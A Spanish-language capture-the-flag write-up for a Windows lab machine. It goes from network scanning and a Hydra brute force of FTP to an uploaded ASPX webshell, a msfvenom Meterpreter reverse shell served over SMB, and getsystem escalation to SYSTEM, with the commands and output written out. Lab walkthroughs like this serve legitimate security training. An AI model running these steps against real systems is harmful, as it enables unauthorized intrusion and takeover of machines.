```markdown
# 🍲 Cocido Andaluz

**Plataforma:** [The Hackers Labs](https://thehackerslabs.com)
**Sistema Operativo:** Windows

---

## 🔍 **Reconocimiento de Hosts**

### Descubrimiento de la IP de la víctima
```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

**Resultado:**
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240

 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.4.3        08:00:27:67:2e:3e      1      60  PCS Systemtechnik GmbH
 10.0.4.38       08:00:27:9a:e7:06      1      60  PCS Systemtechnik GmbH
```

🎯 **IP de la víctima identificada:** `10.0.4.38`

---

## 🚀 **Escaneo de Puertos**

### Escaneo inicial (puertos abiertos)
```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.38
```

### Escaneo detallado (versiones y servicios)
```bash
nmap -n -Pn -sCV -p21,80,139,445 --min-rate 5000 10.0.4.38
```

**Resultado:**
```
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
80/tcp  open  http          Microsoft IIS httpd 7.0
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
```

🔍 **Servicios identificados:**
- **FTP (21):** Microsoft ftpd
- **HTTP (80):** Microsoft IIS 7.0
- **NetBIOS (139):** Microsoft Windows
- **SMB (445):** Microsoft-ds

---

## 🔓 **Fuerza Bruta (FTP)**

### Ataque con Hydra
```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ftp://10.0.4.38 -t 50
```

**Resultado:**
```
[21][ftp] host: 10.0.4.38   login: info   password: PolniyPizdec0211
```

🔑 **Credenciales válidas:**
- **Usuario:** `info`
- **Contraseña:** `PolniyPizdec0211`

---

## 💻 **Acceso Inicial (RCE)**

### Conexión FTP y subida de la webshell ASPX
```bash
ftp info@10.0.4.38
```

**Contenido del directorio FTP (webroot HTTP):**
```
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
```

### Subida de `cmd.aspx` (webshell)
```bash
ftp> put cmd.aspx
```

### Acceso a la webshell
🌐 **URL:** `http://10.0.4.38/cmd.aspx`

---

## 🎯 **Obtención de Shell (Meterpreter)**

### Generación del payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.4.12 LPORT=443 -f exe -o met.exe
```

### Servidor SMB local
```bash
sudo impacket-smbserver share .
```

### Configuración del listener en Metasploit
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.4.12
set LPORT 443
run
```

### Ejecución del payload desde la webshell
```asp
\\10.0.4.12\share\met.exe
```

**Resultado:**
```
[*] Meterpreter session 1 opened (10.0.4.12:443 -> 10.0.4.38:49209)
meterpreter > getuid
Server username: NT AUTHORITY\Servicio de red
```

---

## 🔐 **Escalada de Privilegios**

### Obtención de privilegios SYSTEM
```bash
meterpreter > getsystem
...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

🎉 **¡Acceso completo al sistema obtenido!**
```markdown
✅ **Objetivo cumplido:** Privilegios máximos (SYSTEM) en la máquina víctima.
```
```
